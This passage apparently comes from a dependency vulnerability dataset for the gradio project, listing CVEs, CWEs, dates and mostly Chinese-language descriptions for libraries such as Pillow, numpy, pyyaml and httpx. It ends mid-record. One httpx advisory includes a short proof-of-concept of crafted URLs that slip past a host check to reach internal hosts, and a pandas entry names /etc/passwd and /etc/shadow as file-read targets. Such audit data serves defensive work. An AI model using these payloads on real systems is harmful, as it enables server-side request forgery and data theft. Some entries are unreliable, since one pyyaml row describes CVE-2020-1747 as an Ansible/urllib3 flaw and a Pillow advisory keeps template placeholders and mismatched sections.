gradio-app_gradio,numpy,">=1.0,<3.0",True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,">=1.0,<3.0",True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,">=1.0,<3.0",True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,orjson,~=3.0,True,CVE-2024-27454,CWE-674,2024-02-26,"orjson是ijl个人开发者的一个快速、正确的 Python JSON 库。
orjson 3.9.15之前版本存在安全漏洞，该漏洞源于不限制深度嵌套JSON文档的递归。",2,2
gradio-app_gradio,pandas,">=1.0,<3.0",True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,">=1.0,<3.0",True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,pillow,">=8.0,<13.0",True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,pillow,">=8.0,<13.0",True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2022-30595,CWE-787,2022-05-17,"Pillow是一款基于Python的图像处理库。
Pillow 9.1.0 版本存在安全漏洞，该漏洞源于在处理TGA文件时存在边界错误。远程攻击者利用该漏洞可以将专门设计的数据传递给应用程序，触发基于堆的缓冲区溢出，并在目标系统上执行任意代码。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-25292,CWE-1333,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于PDF解析器允许通过一个特制的PDF文件进行正则表达式DoS（ReDoS）攻击。",3,0
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,pillow,">=8.0,<13.0",True,,CWE-125,2021-10-02,"## Overview

Affected versions of this package are vulnerable to Out-of-bounds Read. The previous bounds check in `FilDecode.c` incorrectly calculated the required read buffer size when copying a chunk, potentially reading six extra bytes off the end of the allocated buffer from the heap.
## Remediation
Upgrade `pillow` to version 8.3.2 or higher.
## References
- [GitHub Release](https://github.com/python-pillow/Pillow/releases/tag/8.3.2)
",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-23437,CWE-125,2021-09-03,"Pillow是一款基于Python的图像处理库。
python中pillow模块8.3.2之前版本存在缓冲区错误漏洞，该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题，攻击者利用该漏洞可导致拒绝服务。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-25287,CWE-125,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在缓冲区错误漏洞，该漏洞允许远程攻击者访问敏感的信息。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-25288,CWE-125,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在缓冲区错误漏洞，该漏洞允许远程攻击者访问敏感的信息。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,pillow,">=8.0,<13.0",True,CVE-2020-35655,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
在Pillow 8.1.0之前版本存在缓冲区错误漏洞，该漏洞源于当解码SGI RLE图像文件时，SGIRleDecode有一个4字节的缓冲区过读，因为偏移量和长度表被错误处理。",3,0
gradio-app_gradio,pyyaml,">=5.0,<7.0",True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
gradio-app_gradio,pyyaml,">=5.0,<7.0",True,CVE-2020-1747,CWE-20,2020-03-02,CVE-2020-1747 是一个影响 Ansible 模块的漏洞，具体是在 Ansible 库中使用的 urllib3 组件存在一个不安全的序列化漏洞。攻击者可以通过发送精心构造的 YAML 格式数据包来利用此漏洞，从而在目标系统上执行任意代码。漏洞的根本原因是 Ansible 在处理外部输入时，未能正确地验证和过滤输入数据，导致了反序列化漏洞的产生。,1,0
gradio-app_gradio,starlette,">=0.40.0,<1.0",True,CVE-2025-54121,CWE-770,2025-07-21,Starlette 是一个快速的异步 Python Web 框架，常用于构建高性能的 Web 应用程序和 API。该漏洞涉及 Starlette 在解析多部件表单时处理大文件的机制，具体来说，当文件大小超过默认最大缓冲区大小时，Starlette 会将文件转存到磁盘，这一过程会阻塞主线程，导致无法接受新的连接。漏洞的成因是代码未能正确判断文件是否需要转存到磁盘，导致事件线程阻塞。,3,2
gradio-app_gradio,starlette,">=0.40.0,<1.0",True,CVE-2025-62727,CWE-407,2025-10-28,"Starlette 是一个轻量级的 ASGI 框架和工具包，主要用于构建基于 Python 的异步 Web 服务。它支持高性能的异步请求处理，并提供如路由、中间件、静态文件服务等功能。

此漏洞出现在 Starlette 的 FileResponse 组件中，该组件用于处理文件响应，例如通过 StaticFiles 或直接使用 FileResponse 提供静态文件服务时。
在 0.49.1 版本之前，未经身份验证的攻击者可以发送一个精心构造的 HTTP Range 头，触发 FileResponse 的 Range 头解析和合并逻辑中的二次时间复杂度处理。具体来说，FileResponse 的 `_parse_range_header()` 方法在解析多范围请求时，使用的正则表达式存在 O(n^2) 的复杂度，导致处理时间显著增加。此外，合并逻辑通过扫描整个结果列表进一步放大了这种复杂度，从而使每个请求能够引发 CPU 资源的耗尽，导致拒绝服务攻击。
该漏洞的技术细节包括：
- 使用 `_RANGE_PATTERN` 正则表达式解析 Range 头部时，处理时间复杂度为 O(n^2)。
- 合并范围时，遍历结果列表进行比较，也会导致 O(n^2) 的处理时间。
攻击者可以通过构造包含多个小的、不重叠的范围或特定数字子串的 Range 头，最大化处理复杂度。
该问题影响所有使用 FileResponse 或 StaticFiles 提供文件服务的 Starlette 应用程序，同时也间接影响基于 Starlette 构建的框架，例如 FastAPI。",2,1
gradio-app_gradio,IPython,,True,CVE-2015-4707,CWE-79,2015-06-22,"IPython是IPython团队开发的一个Python的原生交互式shell的增强版。

Ipython 3.2之前的版本中存在跨站脚本漏洞。远程攻击者可利用该漏洞注入任意的Web脚本或HTML。",3,0
gradio-app_gradio,IPython,,True,CVE-2015-4706,CWE-79,2015-06-22,"IPython是IPython团队开发的一个Python的原生交互式shell的增强版。
Ipython 3.2之前的3.x版本中存在跨站脚本漏洞。远程攻击者可利用该漏洞注入任意的Web脚本或HTML。",3,0
gradio-app_gradio,IPython,,True,CVE-2022-21699,CWE-250 CWE-279 CWE-269,2022-01-19,"Interactive Python（IPython）是一个用于使用多种编程语言进行交互式计算的命令shell，最初是为Python编程语言开发的。
Interactive Python 存在安全漏洞，攻击者可利用该漏洞以另一个用户的身份运行代码。",2,0
gradio-app_gradio,IPython,,True,CVE-2015-5607,CWE-352,2017-09-20,"IPython是IPython团队开发的一个Python的原生交互式shell的增强版。REST API是其中的一个支持轻量级REST风格Web脚本的API。
IPython 2版本和3版本中的REST API存在跨站请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。",2,0
gradio-app_gradio,IPython,,True,CVE-2023-24816,CWE-20 CWE-78,2023-02-10,"Interactive Python（IPython）是一个用于使用多种编程语言进行交互式计算的命令shell，最初是为Python编程语言开发的。
IPython(Interactive Python) 8.1.0之前版本存在操作系统命令注入漏洞。攻击者利用该漏洞执行命令注入攻击。",4,0
gradio-app_gradio,boto3,,True,,CWE-200,2017-03-10,"## Overview
[`boto3`](https://pypi.python.org/pypi/boto3) is the AWS SDK for Python.

Affected versions of this package are vulnerable to Information Exposure due to logging all of the bytes uploaded when the logger is set to the `INFO` level.

## Remediation
Upgrade `boto3` to version 1.4.5 or higher.

## References
- [GitHub Issue](https://github.com/boto/boto3/issues/1017)
- [GitHub Commit](https://github.com/boto/boto3/commit/5a4396a4e0d1b337c081cb4095e5255da915198e)",4,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,httpx,,True,,CWE-20,2022-05-13,"## Overview
[httpx](https://pypi.org/project/httpx) is a The next generation HTTP client.

Affected versions of this package are vulnerable to Improper Input Validation due to improper implementation of `httpx.URL().copy_with`, that causes `httpx.Client` and `httpx.Proxy` to parse wrong URL. Exploiting this vulnerability leads to blacklist bypass.

## PoC:

**httpx.Client**

```python
user_input_from_http_request = 'http:////admin-dashboard/secret'
u = httpx.URL(user_input_from_http_request)
assert u.host.lower() != 'admin-dashboard'
resp = httpx.Client(base_url=u).get('/') # SSRF to http://admin-dashboard/secret
print(resp.text) # sensitive data leak
```

**httpx.Proxy**

```python
user_input_from_http_request = 'http://x@//internal-proxy:8082/'
u = httpx.URL(user_input_from_http_request)
assert u.host.lower() != 'internal-proxy'
# httpx.Proxy(u).url.netloc == b'internal-proxy:8082'
resp = httpx.Client(proxies=u).get('/') # will request via http proxy at internal-proxy:8082
```
## Remediation
Upgrade `httpx` to version 0.23.0 or higher.
## References
- [GitHub Commit](https://github.com/encode/httpx/pull/2185/commits/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)
- [GitHub Issue](https://github.com/encode/httpx/issues/2184)
- [GitHub PR](https://github.com/encode/httpx/pull/2185)
",3,0
gradio-app_gradio,httpx,,True,CVE-2021-41945,CWE-20,2022-04-28,"Encode OSS httpx是英国Encode OSS公司的一个功能齐全的 HTTP 客户端。提供同步和异步 API，支持 HTTP/1.1 和 HTTP/2。
